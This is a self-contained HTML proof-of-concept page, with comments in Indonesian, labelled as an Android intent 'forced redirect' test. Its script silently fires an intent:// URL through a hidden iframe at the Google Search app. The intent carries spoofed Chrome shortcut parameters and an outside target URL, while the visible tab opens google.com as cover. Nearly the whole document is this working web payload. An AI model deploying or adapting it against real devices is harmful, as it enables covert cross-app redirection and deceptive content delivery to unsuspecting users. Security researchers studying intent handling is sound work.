<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Android Intent PoC - Forced Redirect</title>
  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #f8f9fa;
      color: #202124;
      min-height: 100vh;
      margin: 0;
      display: grid;
      place-content: center;
      text-align: center;
    }

    a {
      display: inline-block;
      padding: 16px 28px;
      background: #1a73e8;
      color: white;
      text-decoration: none;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
    }

    a:active {
      background: #1557b0;
    }
  </style>
</head>
<body>

  <h2>Android Intent Test</h2>
  <!-- Mengarahkan link secara langsung ke google.com sebagai fallback dasar -->
  <a href="https://www.google.com" id="intentLink" target="_blank">
    Open Window & Android Intent Test
  </a>

  <script>
    const TARGET_URL = "https://www.google.com";
    const INTENT_URL = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";

    let isTriggered = false;

    document.getElementById("intentLink").addEventListener("click", function(e) {
      if (isTriggered) return;
      isTriggered = true;

      // 1. Buat iframe tersembunyi khusus untuk memicu skema intent di background
      // Cara ini mencegah intent mengambil alih jendela utama browser Anda
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = INTENT_URL;
      document.body.appendChild(iframe);

      // 2. Buka target URL (google.com) di tab/jendela baru secara bersamaan
      const newWindow = window.open(TARGET_URL, '_blank');

      // 3. Pastikan halaman saat ini juga ikut mengarah ke Google jika window.open diblokir
      setTimeout(() => {
        if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
          window.location.replace(TARGET_URL);
        }
      }, 300);

      // 4. Bersihkan elemen iframe setelah eksekusi
      setTimeout(() => {
        if (iframe && iframe.parentNode) {
          iframe.parentNode.removeChild(iframe);
        }
        isTriggered = false;
      }, 1500);
    });
  </script>

</body>
</html>
